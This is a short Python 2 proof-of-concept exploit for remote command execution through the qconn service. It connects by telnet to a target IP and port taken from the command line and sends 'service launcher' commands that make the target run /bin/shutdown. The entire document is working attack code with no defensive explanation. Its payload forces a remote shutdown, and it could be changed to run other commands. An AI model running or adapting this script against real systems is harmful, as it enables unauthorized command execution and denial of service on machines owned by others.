import telnetlib
import sys
 
if len(sys.argv) < 3:
  print " "
  print " -----------------------------------------------------"
  print " + Qconn Remote Command Execution PoC (Shutdown) +"
  print " -----------------------------------------------------"
  print " "
  print " + Usage: QCONNRC.py <Target IP> <Port>"
  print "    + Ex> QCONNRC.py 192.168.0.1 8000"
  print ""
  sys.exit(1)
 
host = sys.argv[1]
port = int(sys.argv[2])
attack ="service launcher\n" + "start/flags 8000 /bin/shutdown /bin/shutdown -b\n" + "continue\n"
telnet = telnetlib.Telnet(host, port)
telnet.write(attack)
print "[+] Finish"
telnet.close()
